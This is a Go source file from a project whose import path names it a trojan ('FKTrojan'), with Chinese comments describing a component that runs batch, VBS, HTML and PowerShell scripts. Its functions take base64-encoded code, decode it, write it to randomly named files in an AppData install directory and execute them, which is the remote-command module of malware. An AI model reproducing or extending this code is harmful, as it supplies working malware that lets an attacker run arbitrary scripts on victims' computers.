/*
Author: FreeKnight
执行批处理，VBS，HTML，PowerShell脚本
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"errors"
	"os"
)

//------------------------------------------------------------
// 执行脚本选择器
func handleScripters(mode string, code string) (string, error) {
	if mode == "0" {
		return batchScripter(common.Base64Decode(code))
	} else if mode == "1" {
		return vbsScripter(common.Base64Decode(code))
	} else if mode == "2" {
		return htmlScripter(common.Base64Decode(code))
	} else if mode == "3" {
		return powerShellScripter(common.Base64Decode(code))
	}

	return "", errors.New("Unknown command.")
}

//------------------------------------------------------------
// 批处理脚本
func batchScripter(code string) (string, error) {
	n := randomString(5, false)
	n_Batch, _ := os.Create(tmpAppDataInstallDir + n + ".bat")
	n_Batch.WriteString(code)
	n_Batch.Close()
	return runThirdExe(tmpAppDataInstallDir + n + ".bat")
}

//------------------------------------------------------------
// vbs脚本
func vbsScripter(code string) (string, error) {
	n := randomString(5, false)
	n_vbs, _ := os.Create(tmpAppDataInstallDir + n + ".vbs")
	n_vbs.WriteString(code)
	n_vbs.Close()
	return runThirdExe(tmpAppDataInstallDir + n + ".vbs")
}

//------------------------------------------------------------
// Html脚本
func htmlScripter(code string) (string, error) {
	n := randomString(5, false)
	n_HTML, _ := os.Create(tmpAppDataInstallDir + n + ".html")
	n_HTML.WriteString(code)
	n_HTML.Close()
	return runThirdExe(tmpAppDataInstallDir + n + ".html")
}

//------------------------------------------------------------
// powerShell脚本
func powerShellScripter(code string) (string, error) {
	n := randomString(5, false)
	n_PowerShell, _ := os.Create(tmpAppDataInstallDir + n + ".ps1")
	n_PowerShell.WriteString(code)
	n_PowerShell.Close()
	return runThirdExe(tmpAppDataInstallDir + n + ".ps1")
}

//------------------------------------------------------------
